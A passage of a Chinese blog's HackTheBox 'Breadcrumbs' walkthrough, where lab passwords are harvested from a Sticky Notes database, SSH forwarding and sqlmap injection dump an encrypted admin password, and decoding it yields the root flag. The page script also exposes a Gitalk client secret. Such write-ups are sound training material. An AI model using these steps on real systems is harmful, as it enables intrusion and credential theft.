+<p><a href="https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10" target="_blank" rel="noopener">https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10</a></p>
+</blockquote>
+<pre><code class="cpp">cd C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/2606c3a6-0297-46e8-98a3-3cb4fba09389.png" class>
+
+<p>现在我们要把sqlite文件搞下来</p>
+<p>这里什么smb共享啊 nc传输啊 或是其他方式的，很多方法，我就不演示了，大家用自己喜欢的方法搞吧。搞下来后，在自己电脑上也要放在同一位置，然后进行查看</p>
+<pre><code class="cpp">juliette: jUli901./())!
+development: fN3)sN5Ee@g
+administrator: [MOVED]
+</code></pre>
+<p>这是咱们得到的内容，也就是密码</p>
+<p>咱们使用ssh登录development这个账户</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/06357381-0eaa-41fe-8895-383c003acab2.png" class>
+
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/cd414f8b-3e49-4881-af68-6b260168a15c.png" class>
+
+<p>咱们检查一下krypter_linux</p>
+<p>咱们用上面相同的放式给搞下来，然后查看</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/3581de3d-b044-4746-8c53-73d5e1281246.png" class>
+
+<p>我们可以看到目标机器位于1234端口</p>
+<p>搞他</p>
+<p>咱们使用ssh做一个动态端口转发</p>
+<pre><code class="cpp">ssh -L 1234:127.0.0.1:1234 [development@10.10.10.228](mailto:development@10.10.10.228)
+</code></pre>
+<p>然后让我们访问一下这个页面</p>
+<pre><code class="cpp">curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&#39;
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d895b412-e2e4-4dc1-b88c-43eace3df37b.png" class>
+
+<p>我们得到了一个aes密钥k19D193j.&lt;19391(</p>
+<p>我们使用sqlmap进行注入</p>
+<pre><code class="cpp">sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&amp;username\=administrator\&amp;table\=passwords --dump
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/377d42bf-dcc5-4f83-9393-0d2875648319.png" class>
+
+<pre><code class="cpp">account = Administrator
+aes_key = k19D193j.&lt;19391(
+password = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=
+</code></pre>
+<p>使用在线工具进行解密</p>
+<blockquote>
+<p><a href="https://www.devglan.com/online-tools/aes-encryption-decryption" target="_blank" rel="noopener">https://www.devglan.com/online-tools/aes-encryption-decryption</a></p>
+</blockquote>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/7f8b6af4-c154-4bf2-99a3-a781a3973a0f.png" class>
+
+<pre><code class="cpp">cEBzc3cwcmQhQCMkOTg5MC4v
+</code></pre>
+<p>我们使用base64进行解密</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/396206c5-a50b-4645-b5d4-d7194941a1fc.png" class>
+
+<pre><code class="cpp">[p@ssw0rd!@#$9890./](mailto:p@ssw0rd!@#$9890./)
+</code></pre>
+<p>使用ssh登录administrator账户即可</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/9b416034-80f1-4f68-95ac-13f9e7de4434.png" class>
+
+<p>提权administrator成功</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/8430ab0c-c686-43ef-b095-587aa0730a73.png" class>
+
+<p>成功拿到root权限的flag</p>
+<p>收工吃夜宵</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&title=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&title=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/06/24/Hackthebox/Hackthebox-Monitors/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Monitors - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/17/Hackthebox/Hackthebox-Spider/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Spider - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&title=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&title=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Breadcrumbs - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsUlEQVR42u3aQW7jQAwEwPz/07tATruAbXSTM7YPpZOhKLJKAYZMD39+4uPP7/H6c/LTf8+3v/vsbgcOPDw8vNGjPzvaB0rOvKa2z/PsGjw8PLzbvKQYJMjZUp6T6m/Ew8PD+yivbbVnL6Vt6/Hw8PC+nzdb7jf3wcPDw/tOXtvO5nFAHmHkr+NK1oKHh4cX805tgL3z8wf29/Dw8PDiJT7ffMqHA9pts+HT4uHh4V3gvd7cSkamXjeym+GqtiQU/zHg4eHhLXibsaoNqS0S7Z/hv7qHh4eHd42XP0q73O+X+DYyxsPDw7vH2w8KzDbDknvOik00H4GHh4d3lJdvwM9ii1NhRD0ugIeHh3eBN2teNyMImyGGNhrGw8PDO8tLGtO8sc7v0wa+QzweHh7eBV5eEg7PLASYfEPuQMXDw8PDC55nFoxuRlQ3Y6n1K8PDw8O7wGtb3vzL8sGsswOyeHh4eLd5+8U937hq8W2A++AJ8fDw8C7zZqFqG7BurmyHD/Dw8PDeyWtb21kEnLfjr8/UhQEPDw9vwTv10PlCX2QkZYSBh4eH9x5evknfxg2z0YS8DERjCnh4eHiXeS0pKRV5GUhedMIr5rnw8PDwRrw2YJ0NYG222doW/MH1eHh4eBd47cBTuzH2zlGtp3fAw8PDO8TLF+K2ac6LQVswkqKFh4eH9x7e60W2xW8i2jbqjQoDHh4e3iHeZoFuo9W84d6EI8Uv4OHh4Y14m0GrGXUDOxZG4OHh4R2KcWfL+gywHym4OF6Ah4eHF/BmxSDfwj9VZvJYBA8PD+89vH0xaLevZgFunbXg4eHhfZSXlIRZITk1hvXgSjw8PLwv4LWN9aw5bovKgZYaDw8Pr+TlQUDbcOdjCvkWVx6F4OHh4d3gbQab9iFse2YWWODh4eEd4v0FvbiccQIoZb4AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
